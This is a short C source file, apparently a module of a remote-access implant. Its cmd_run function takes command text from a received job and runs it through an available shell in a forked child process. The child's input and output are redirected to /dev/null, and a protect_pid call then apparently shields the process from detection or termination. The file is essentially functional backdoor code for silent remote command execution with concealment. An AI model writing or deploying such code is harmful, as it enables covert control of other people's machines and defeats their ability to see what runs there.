#include "../inc/cmds.h"

#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>

/*

 * run command creates a child process to run a provided command
 * command is run with an available shell

*/

char *cmd_run(job_t *job) {
  cmd_recv_all(job);

  pid_t cpid  = 0;
  char *shell = NULL, *res = NULL;

  // find an available shell
  if ((shell = shell_find()) == NULL)
    return "no available shell";

  // create the child process to execute the command
  if ((cpid = fork()) == 0) {
    int nullfd = 0;

    // remove signal handlers
    signal(SIGINT, SIG_DFL);
    signal(SIGILL, SIG_DFL);
    signal(SIGSEGV, SIG_DFL);

    // redirect std{out,err,in} to /dev/null
    if ((nullfd = open("/dev/null", O_RDWR)) > 0) {
      dup2(nullfd, fileno(stdout));
      dup2(nullfd, fileno(stderr));
      dup2(nullfd, fileno(stdin));
    }

    // chdir to rootdir
    if (chdir("/") < 0)
      exit(1);

    // execute the command
    char *const argv[] = {shell, "-c", job->data, NULL};
    execvp(shell, argv);

    // just in case the command fails
    exit(1);
  }

  if (cpid < 0) {
    job_debug_err("failed to create fork for running the command");
    return "fork failed";
  }

  // protect the PID
  if (!protect_pid(cpid)) {
    job_debug("failed to protect the command process");
    return "failed to protect the command process";
  }

  job_debug("launched a child process (%d) for a %s command", cpid, shell);
  return "success";
}
